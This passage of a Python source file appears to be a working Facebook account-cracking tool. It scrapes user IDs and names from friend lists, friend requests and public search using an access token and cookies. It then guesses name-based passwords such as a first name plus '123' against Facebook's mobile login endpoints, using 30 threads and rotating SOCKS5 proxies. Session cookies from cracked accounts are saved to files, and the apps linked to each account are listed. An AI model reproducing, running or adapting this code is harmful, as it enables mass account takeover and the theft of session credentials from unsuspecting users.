	if ask in["1"]:
		prints(Panel(f"""{P2}to stop dumping please press ctrl then c in keyboard or turn off data""",width=80,style=f"{color_table}"))
		url = "https://mbasic.facebook.com/friends/center/suggestions"
		get_requestspage(url,cookie)
		exit(Brute.setting_password(id))
	elif ask in["2"]:
		prints(Panel(f"""{P2}to stop dumping please press ctrl then c in keyboard or turn off data""",width=80,style=f"{color_table}"))
		url = "https://mbasic.facebook.com/friends/center/requests"
		get_requestspage(url,cookie)
		exit(Brute.setting_password(id))
	elif ask in["3"]:
		prints(Panel(f"""{P2}to stop dumping please press ctrl then c in keyboard or turn off data""",width=80,style=f"{color_table}"))
		url = "https://mbasic.facebook.com/friends/center/requests/outgoing"
		get_requestspage(url,cookie)
		setting_password(id)

###----------[ GET DATA FROM REQUESTS PAGE ]---------- ###
def get_requestspage(url,cookie):
	try:
		data=parser(ses.get(url,cookies=cookie).text,"html.parser")
		for z in data.find_all('a',href=True):
			if 'hovercard' in z['href']:
				uid = re.search('uid=(.*?)&',z['href']).group(1)
				nm = z.text
				iso = uid+"<=>"+nm
				if iso in id:pass
				else:
					id.append(iso)
					sys.stdout.write(f"\r {N}process colecting id, succes colect {len(id)} id....");sys.stdout.flush()
		for x in data.find_all('a',href=True):
			if 'Lihat selengkapnya' in x.text:
				get_requestspage("https://mbasic.facebook.com"+x["href"],cookie)
	except:
		pass

def friendsfromfriends(token,cookie):
	prints(Panel(f"""{P2}[{color_rich}01{P2}]. dump friends from friends for id new
[{color_rich}02{P2}]. dump friends from friends for id old
[{color_rich}03{P2}]. dump friends from friends for id random""",width=80,padding=(0,14),style=f"{color_table}"))
	pil = input(f" {N}input choice : ")
	if pil in["1","01"]:
		prints(Panel(f"""{P2}input the target id, make sure the target id is public and not private""",subtitle=f"{P2}fill 'me' for dump from your friends",width=80,style=f"{color_table}"))
		idt = input(f" {N}input target id : ")
		prints(Panel(f"""{P2}to stop dumping please press ctrl then c in keyboard or turn off data""",width=80,style=f"{color_table}"))
		get_id_new(idt,token,cookie)
		setting_password(id)
	elif pil in["2","02"]:
		prints(Panel(f"""{P2}input the target id, make sure the target id is public and not private""",subtitle=f"{P2}fill 'me' for dump from your friends",width=80,style=f"{color_table}"))
		idt = input(f" {N}input target id : ")
		prints(Panel(f"""{P2}to stop dumping please press ctrl then c in keyboard or turn off data""",width=80,style=f"{color_table}"))
		get_id_old(idt,token,cookie)
		setting_password(id)
	elif pil in["3","03"]:
		prints(Panel(f"""{P2}input the target id, make sure the target id is public and not private""",subtitle=f"{P2}fill 'me' for dump from your friends",width=80,style=f"{color_table}"))
		idt = input(f" {N}input target id : ")
		prints(Panel(f"""{P2}to stop dumping please press ctrl then c in keyboard or turn off data""",width=80,style=f"{color_table}"))
		get_id_random(idt,token,cookie)
		setting_password(id)

def get_id_new(idt,token,cookie):
	try:
		for idz in ses.get(f"https://graph.facebook.com/{idt}?fields=name,friends.fields(id,name).limit(5000)&access_token={token}",cookies=cookie).json()["friends"]["data"]:
			try:
				for i in ses.get(f"https://graph.facebook.com/{idz['id']}?fields=name,friends.fields(id,name).limit(5000)&access_token={token}",cookies=cookie).json()["friends"]["data"]:
					if i["id"][:5] in ["10008"] or i["id"][:5] in ["10007"]:
						if i["id"]+"<=>"+i["name"] in id:
							pass
						else:
							#print(i["id"]+"<=>"+i["name"])
							id.append(i["id"]+"<=>"+i["name"])
					sys.stdout.write(f"\r {N}process colecting id, succes colect {len(id)} id....");sys.stdout.flush()
			except:continue
	except:pass

def get_id_old(idt,token,cookie):
	try:
		for idz in ses.get(f"https://graph.facebook.com/{idt}?fields=name,friends.fields(id,name).limit(5000)&access_token={token}",cookies=cookie).json()["friends"]["data"]:
			try:
				for i in ses.get(f"https://graph.facebook.com/{idz['id']}?fields=name,friends.fields(id,name).limit(5000)&access_token={token}",cookies=cookie).json()["friends"]["data"]:
					if len(i["id"]) <= 10:
						if i["id"]+"<=>"+i["name"] in id:
							pass
						else:
							id.append(i["id"]+"<=>"+i["name"])
					sys.stdout.write(f"\r {N}process colecting id, succes colect {len(id)} id....");sys.stdout.flush()
			except:continue
	except:pass

def get_id_random(idt,token,cookie):
	try:
		for idz in ses.get(f"https://graph.facebook.com/{idt}?fields=name,friends.fields(id,name).limit(5000)&access_token={token}",cookies=cookie).json()["friends"]["data"]:
			try:
				for i in ses.get(f"https://graph.facebook.com/{idz['id']}?fields=name,friends.fields(id,name).limit(5000)&access_token={token}",cookies=cookie).json()["friends"]["data"]:
					if i["id"]+"<=>"+i["name"] in id:
						pass
					else:
						id.append(i["id"]+"<=>"+i["name"])
					sys.stdout.write(f"\r {N}process colecting id, succes colect {len(id)} id....");sys.stdout.flush()
			except:continue
	except:pass

def friends_from_search(token,cookie):
	name = input(f" {N}input name : ")
	limit = int(input(f" {N}input limit : "))
	prints(Panel(f"""{P2}to stop dumping please press ctrl then c in keyboard or turn off data""",width=80,style=f"{color_table}"))
	url = "https://mbasic.facebook.com/public/"+name
	get_friends_from_search(url,token,cookie,limit)
	get_data(token,cookie)
	setting_password(id)

def get_friends_from_search(url,token,cookie,limit):
	try:
		data=parser(ses.get(url).text,"html.parser")
		for z in data.find_all("td"):
			for ids in z.find_all("a",href=True):
				if "profile.php?id" in ids.get("href"):
					try:
						uid = ids.get("href").split("=")[1]
						if uid in idz:
							pass
						else:
							if len(idz)==limit:break
							else:idz.append(uid)
					except:continue
		for x in data.find_all("a",href=True):
			if "Lihat Hasil Selanjutnya" in x.text:
				url2 = x.get("href")
				get_friends_from_search(url2,token,cookie,limit)
	except:
		pass

def get_data(token,cookie):
	try:
		for idt in idz:
			for i in ses.get(f"https://graph.facebook.com/{idt}?fields=name,friends.fields(id,name).limit(5000)&access_token={token}",cookies=cookie).json()["friends"]["data"]:
				id.append(i["id"]+"<=>"+i["name"])
				sys.stdout.write(f"\r {N}process colecting id, succes colect {len(id)} id....");sys.stdout.flush()
	except Exception as e:
		print(e)

def multi_files():
	try:tanya_total = int(input(f" {N}input total files : "))
	except:tanya_total=1
	for t in range(tanya_total):
		t +=1
		print("")
		try:
			file = input(f" {N}input file location {t} : ")
			read = open(files,"r").readlines()
			for uid in read:
				if uid in id:
					pass
				else:
					id.append(uid)
		except FileNotFoundError:
			prints(Panel(f"""{P2} file not found, please enter the location of the file correctly""",width=80,style=f"{color_table}"))
	setting_password(id)


def setting_password(id):
	print("")
	prints(Panel(f"""{P2}succes collecting {len(id)} id""",width=80,padding=(0,23),style=f"{color_table}"))
	set = input(f" {N}do you want to use manual password?[y/n] : ")
	if set in["y","Y"]:
		manual(id)
	else:
		otomatis(id)

def aturutuan(id):
	urut = []
	urut.append(Panel(f"{P2}[{color_rich}01{P2}]. id old to new",width=24,style=f"{color_table}"))
	urut.append(Panel(f"{P2}[{color_rich}02{P2}]. id new to old",width=24,style=f"{color_table}"))
	urut.append(Panel(f"{P2}[{color_rich}03{P2}]. id random",width=25,style=f"{color_table}"))
	console.print(Columns(urut))
	ask = input(f" {N}choose your choice : ")
	if ask in["1"]:
		id.sort()
		for urutan in id:
			id2.append(urutan)
	elif ask in["2"]:
		for urutan in id:
			id2.insert(0,urutan)
	elif ask in["3"]:
		for urutan in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,urutan)

def manual(id):
	prints(Panel(f"""{P2}create a many password using a comma (,) as a separator""",width=80,style=f"{color_table}"))
	pwx = input(f" {N}create password : ")
	if len(pwx)<=5:
		prints(Panel(f"""{P2}please create a password with at least 6 letters or more""",width=80,style=f"{color_table}"))
		sys.exit()
	aturutuan(id)
	prints(Panel(f"""{P2}if it appears will make the crack process slower, recommended select n""",width=80,style=f"{color_table}"))
	apli = input(f" {N}do you want to show applications when crack?[y/n] : ")
	if apli in["Y","y"]:
		apk.append("show")
	else:
		pass
	azxc.append(Panel(f"""{P2}[{color_rich}01{P2}]. metode freefb
[{color_rich}02{P2}]. metode mbasic
[{color_rich}03{P2}]. metode mobile""",width=37,title=f"{P2}metode reguler",style=f"{color_table}"))
	azxc.append(Panel(f"""{P2}[{color_rich}04{P2}]. metode freefb
[{color_rich}05{P2}]. metode mbasic
[{color_rich}06{P2}]. metode mobile""",width=37,title=f"{P2}metode validate",style=f"{color_table}"))
	console.print(Columns(azxc))
	log = input(f" {N}choose your url login : ")
	if log in["1","01"]:
		mtd_dev.append("free")
		setting_proxy()
		manual_reguler(pwx)
	elif log in["2","02"]:
		mtd_dev.append("mbasic")
		setting_proxy()
		manual_reguler(pwx)
	elif log in["3","03"]:
		mtd_dev.append("mobile")
		setting_proxy()
		manual_reguler(pwx)
	elif log in["4","04"]:
		mtd_dev.append("free")
		setting_proxy()
		manual_validate(pwx)
	elif log in["5","05"]:
		mtd_dev.append("mbasic")
		setting_proxy()
		manual_validate(pwx)
	elif log in["6","06"]:
		mtd_dev.append("mobile")
		setting_proxy()
		manual_validate(pwx)

def otomatis(id):
	aturutuan(id)
	prints(Panel(f"""{P2}if it appears will make the crack process slower, recommended select n""",width=80,style=f"{color_table}"))
	apli = input(f" {N}do you want to show applications when crack?[y/n] : ")
	if apli in["Y","y"]:
		apk.append("show")
	else:
		pass
	azxc.append(Panel(f"""{P2}[{color_rich}01{P2}]. metode freefb
[{color_rich}02{P2}]. metode mbasic
[{color_rich}03{P2}]. metode mobile""",width=37,title=f"{P2}metode reguler",style=f"{color_table}"))
	azxc.append(Panel(f"""{P2}[{color_rich}04{P2}]. metode freefb
[{color_rich}05{P2}]. metode mbasic
[{color_rich}06{P2}]. metode mobile""",width=37,title=f"{P2}metode validate",style=f"{color_table}"))
	console.print(Columns(azxc))
	log = input(f" {N}choose your url login : ")
	if log in["1","01"]:
		mtd_dev.append("free")
		setting_proxy()
		otomatis_reguler()
	elif log in["2","02"]:
		mtd_dev.append("mbasic")
		setting_proxy()
		otomatis_reguler()
	elif log in["3","03"]:
		mtd_dev.append("mobile")
		setting_proxy()
		otomatis_reguler()
	elif log in["4","04"]:
		mtd_dev.append("free")
		setting_proxy()
		otomatis_validate()
	elif log in["5","05"]:
		mtd_dev.append("mbasic")
		setting_proxy()
		otomatis_validate()
	elif log in["6","06"]:
		mtd_dev.append("mobile")
		setting_proxy()
		otomatis_validate()

def setting_proxy():
	prints(Panel(f"""{P2}if you choose n it will use the previous proxy that already exists""",width=80,style=f"{color_table}"))
	pr = input(f" {N}do you want to use the latest proxy?[y/n] : ")
	if pr in["y","Y"]:
		try:
			url = ses.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all').text
			open("proxy.txt","w").write(url)
		except:pass
	else:
		pass

def manual_reguler(pwz):
	global prog,des
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
	des = prog.add_task('',total=len(id2))
	with prog:
		with ThreadPoolExecutor(max_workers=30) as fall:
			saveresulst()
			for user in id2:
				try:
					pwx = []
					uid  = user.split("<=>")[0]
					name = user.split("<=>")[1]
					for z in pwz.split(","):
						pwx.append(z)
					if "free" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"free.facebook.com")
					elif "mbasic" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"mbasic.facebook.com")
					elif "mobile" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"m.facebook.com")
				except Exception as e:
					if "free" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"free.facebook.com")
					elif "mbasic" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"mbasic.facebook.com")
					elif "mobile" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"m.facebook.com")
	prints(Panel(f"""{P2}successfully cracked {len(id2)} id, with result OK : {H2}{len(ok)}{P2} CP : {K2}{len(cp)}{P2}""",width=80,padding=(0,8),style=f"{color_table}"))
	sys.exit()
	
def manual_validate(pwz):
	global prog,des
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
	des = prog.add_task('',total=len(id2))
	with prog:
		with ThreadPoolExecutor(max_workers=30) as fall:
			saveresulst()
			for user in id2:
				try:
					pwx = []
					uid  = user.split("<=>")[0]
					name = user.split("<=>")[1]
					for z in pwz.split(","):
						pwx.append(z)
					if "free" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"free.facebook.com")
					elif "mbasic" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"mbasic.facebook.com")
					elif "mobile" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"m.facebook.com")
				except Exception as e:
					if "free" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"free.facebook.com")
					elif "mbasic" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"mbasic.facebook.com")
					elif "mobile" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"m.facebook.com")
	prints(Panel(f"""{P2}successfully cracked {len(id2)} id, with result OK : {H2}{len(ok)}{P2} CP : {K2}{len(cp)}{P2}""",width=80,padding=(0,8),style=f"{color_table}"))
	sys.exit()

def otomatis_reguler():
	global prog,des
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
	des = prog.add_task('',total=len(id2))
	with prog:
		with ThreadPoolExecutor(max_workers=30) as fall:
			saveresulst()
			for user in id2:
				try:
					pwx = []
					uid,nama = user.split('<=>')[0],user.split('<=>')[1].lower()
					depan = nama.split(" ")[0]
					if len(nama)<=5:
						if len(depan)<3:
							pass 
						else:
							pwx.append(depan+"123")
							pwx.append(depan+"12345")
					else:
						if len(depan)<3:
							pwx.append(nama)
						else:
							pwx.append(nama)
							pwx.append(depan+"123")
							pwx.append(depan+"12345")
					if "free" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"free.facebook.com")
					elif "mbasic" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"mbasic.facebook.com")
					elif "mobile" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"m.facebook.com")
				except Exception as e:
					if "free" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"free.facebook.com")
					elif "mbasic" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"mbasic.facebook.com")
					elif "mobile" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"m.facebook.com")
	prints(Panel(f"""{P2}successfully cracked {len(id2)} id, with result OK : {H2}{len(ok)}{P2} CP : {K2}{len(cp)}{P2}""",width=80,padding=(0,8),style=f"{color_table}"))
	sys.exit()
	
def otomatis_validate():
	global prog,des
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
	des = prog.add_task('',total=len(id2))
	with prog:
		with ThreadPoolExecutor(max_workers=30) as fall:
			saveresulst()
			for user in id2:
				try:
					pwx = []
					uid,nama = user.split('<=>')[0],user.split('<=>')[1].lower()
					depan = nama.split(" ")[0]
					if len(nama)<=5:
						if len(depan)<3:
							pass 
						else:
							pwx.append(depan+"123")
							pwx.append(depan+"12345")
					else:
						if len(depan)<3:
							pwx.append(nama)
						else:
							pwx.append(nama)
							pwx.append(depan+"123")
							pwx.append(depan+"12345")
					if "free" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"free.facebook.com")
					elif "mbasic" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"mbasic.facebook.com")
					elif "mobile" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"m.facebook.com")
				except Exception as e:
					if "free" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"free.facebook.com")
					elif "mbasic" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"mbasic.facebook.com")
					elif "mobile" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"m.facebook.com")
	prints(Panel(f"""{P2}successfully cracked {len(id2)} id, with result OK : {H2}{len(ok)}{P2} CP : {K2}{len(cp)}{P2}""",width=80,padding=(0,8),style=f"{color_table}"))
	sys.exit()

def metode_reguler(user, pwx, url):
	global ok,cp,loop
	ua = random.choice(uasm)
	prox = open("proxy.txt","r").read().splitlines()
	prog.update(des,description=f"{loop}/{len(id)} OK-:[green]{ok}[/] CP-:[yellow]{cp}[/]")
	prog.advance(des)
	for pw in pwx:
		try:
			pw = pw.lower()
			ses=requests.Session()
			proxy= {"http": "socks5://{random.choice(prox)}"}
			headers1= {
				"Host":url,
				"upgrade-insecure-requests":"1",
				"user-agent":ua,
				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
				"x-requested-with":"com.facebook.katana",
				"sec-fetch-site":"same-origin",
				"sec-fetch-mode":"cors",
				"sec-fetch-user":"empty",
				"sec-fetch-dest":"document",
				"referer":f"https://{url}/",
				"accept-encoding":"gzip, deflate br",
				"accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
				}
			p = ses.get(f"https://{url}/login/?next&ref=dbl&fl&refid=8",headers=headers1)
			data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
				"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
				"email":user,
				"pass":pw
				}
			#cookie = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			#cookie += " m_pixel_ratio=2.625; wd=412x756"
			headers2 = {
				"Host": url,
				"cache-control":"max-age=0",
				"upgrade-insecure-requests":"1",
				"origin":f"https://{url}",
				"content-type":"application/x-www-form-urlencoded",
				"user-agent":ua,
				"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
				"x-requested-with":"com.facebook.katana",
				"sec-fetch-site":"same-origin",
				"sec-fetch-mode":"cors",
				"sec-fetch-user":"empty",
				"sec-fetch-dest":"document",
				'referer':f'https://{url}/login/?next&ref=dbl&fl&refid=8',
				"accept-encoding":"gzip, deflate br",
				"accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
				}
			po = ses.post(f"https://{url}/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl",data=data, headers=headers2, proxies=proxy)
			if "c_user" in ses.cookies.get_dict():
				ok.append(user)
				coki = convert(ses.cookies.get_dict())
				user = re.findall('c_user=(.*);xs', coki)[0]
				if "show" in apk:
					get_apk(user,pw,coki)
				else:
					tree = Tree("                                 ")
					tree.add(f"\r{H}{user}|{pw}{P} ")
					tree.add(f"{H}{coki}{N}")
					prints(tree)
				open("OK/%s.txt"%(date_now),"a").write("  * --> %s|%s|%s\n"%(user, pw,coki))
				break
			elif "checkpoint" in ses.cookies.get_dict():
				user = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp.append(user)
				tree = Tree("                                 ")
				tree.add(f"\r{K}{user}|{pw}{P} ")
				prints(tree)
				open("CP/%s.txt"%(date_now),"a").write("  * --> %s|%s\n"%(user, pw))
				break
		except requests.exceptions.ConnectionError:
			sleep(32)

	loop+=1

def metode_validate(user, pwx, url):
	global ok,cp,loop
	ua = random.choice(uasm)
	prox = open("proxy.txt","r").read().splitlines()
	prog.update(des,description=f"{loop}/{len(id)} OK-:[green]{ok}[/] CP-:[yellow]{cp}[/]")
	prog.advance(des)
	for pw in pwx:
		try:
			pw = pw.lower()
			ses=requests.Session()
			proxy= {"http": "socks5://{random.choice(prox)}"}
			headers1= {
				"Host": url,
				"cache-control": "max-age=0",
				"user-agent": ua,
				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
				"sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="101"',
				"sec-ch-ua-mobile": "?1",
				"sec-fetch-site": "same-origin",
				"sec-fetch-mode": "cors",
				"sec-fetch-dest": "empty",
				"sec-fetch-user": "?1",
				"upgrade-insecure-requests": "1",
				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			p = ses.get(f"https://{url}/login/device-based/password/?uid={user}&flow=login_no_pin&next=https%3A%2F%2F{url}%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",headers=headers1)
			data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
				"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
				"uid":user,
				"next":f"https://{url}/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified",
				"pass":pw,
				"flow":"login_no_pin"}
			cookie = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			cookie += " m_pixel_ratio=2.625; wd=412x756"
			headers2 = {
				"Host": url,
				"connection": "keep-alive",
				"cache-control": "max-age=0",
				"save-data": "on",
				"origin": "https://m.facebook.com",
				"content-type": "application/x-www-form-urlencoded",
				"user-agent": ua,
				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
				"x-requested-with": "com.facebook.katana",
				"dnt": "1",
				"sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="101"',
				"sec-ch-ua-platform": '"Android"',
				"sec-ch-ua-mobile": "?1",
				"sec-fetch-site": "same-origin",
				"sec-fetch-mode": "cors",
				"sec-fetch-dest": "empty",
				"sec-fetch-user": "?1",
				"upgrade-insecure-requests": "1",
				"referer": f"https://{url}/login/device-based/password/?uid={user}&flow=login_no_pin&next=https%3A%2F%2F{url}%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
				"accept-encoding": "gzip, deflate br",
				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			po = ses.post(f"https://{url}/login/device-based/validate-password/?shbl=0&locale2=id_ID",data=data, headers=headers2, cookies={"cookie": cookie}, proxies=proxy, allow_redirects=False)
			if "c_user" in ses.cookies.get_dict():
				ok.append(user)
				coki = convert(ses.cookies.get_dict())
				user = re.findall('c_user=(.*);xs', coki)[0]
				if "show" in apk:
					get_apk(user,pw,coki)
				else:
					tree = Tree("                                 ")
					tree.add(f"\r{H}{user}|{pw}{P} ")
					tree.add(f"{H}{coki}{N}")
					prints(tree)
				open("OK/%s.txt"%(date_now),"a").write("  * --> %s|%s|%s\n"%(user, pw,coki))
				break
			elif "checkpoint" in ses.cookies.get_dict():
				user = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp.append(user)
				tree = Tree("                                 ")
				tree.add(f"\r{K}{user}|{pw}{P} ")
				prints(tree)
				open("CP/%s.txt"%(date_now),"a").write("  * --> %s|%s\n"%(user, pw))
				break
		except requests.exceptions.ConnectionError:
			sleep(32)
	loop+=1

def language(cookie):
	try:
		url = ses.get('https://mbasic.facebook.com/language/',cookies=cookie)
		data = parser(url.text,'html.parser')
		for x in data.find_all('form',{'method':'post'}):
			if 'Bahasa Indonesia' in str(x):
				bahasa = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(url.text)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),"submit"  : "Bahasa Indonesia"}
				eksekusi = ses.post('https://mbasic.facebook.com' + x['action'],data=bahasa,cookies=cookie)
	except:pass

###----------[ GET APK FROM COOKIE ]---------- ###
def get_apk(user,pw,cok):
	cookie = {"cookie":cok}
	language(cookie)
	tree = Tree("                                 ")
	tree.add(f"\r{H}{user}|{pw}{N} ")
	tree.add(f"\r{H}{cok}{N}")
	try:
		active = Tree(f"\r{N}active application :")
		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active"
		get_active(url,active,cookie)
	except Exception as e:
		print(e)
	try:
		inactive = Tree(f"\r{N}inactive application :")
		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive"
		get_inactive(url,inactive,cookie)
	except Exception as e:
		print(e)
	tree.add(active)
	tree.add(inactive)
	prints(tree)

def get_active(url,active,cookie):
	try:
		data = parser(ses.get(url,cookies=cookie).text,"html.parser")
		for apk in data.find_all("h3"):
			if "Ditambahkan" in apk.text:
				active.add(f"\r{H}{str(apk.text).replace('Ditambahkan',' Ditambahkan')}{N}")
			else:continue
		next = "https://mbasic.facebook.com" + data.find("a",string="Lihat Lainnya")["href"]
		get_active(next,active,cookie)
	except:pass

###----------[ GET APK INACTIVE ]---------- ###
def get_inactive(url,inactive,cookie):
	try:
		data = parser(ses.get(url,cookies=cookie).text,"html.parser")
		for apk in data.find_all("h3"):
			if "Kedaluwarsa" in apk.text:
				inactive.add(f"\r{M}{str(apk.text).replace('Kedaluwarsa',' Kedaluwarsa')}{N}")
			else:continue
		next = "https://mbasic.facebook.com" + data.find("a",string="Lihat Lainnya")["href"]
		get_inactive(next,inactive,cookie)
	except:pass

###----------[ CONVERT COOKIE ]---------- ###
def convert(cookie):
	cok = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s'%(cookie['sb'],cookie['datr'],cookie['c_user'],cookie['xs'],cookie['fr']))
	return(str(cok))

###----------[ PRINT SAVE RESULTS ]---------- ###
def saveresulst():
	prints(Panel(f"""\r{P2}results acoount ok saved to : {date_now}
results acoount cp saved to : {date_now}""",width=80,padding=(0,10),style=f"{color_table}"))

if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	login()
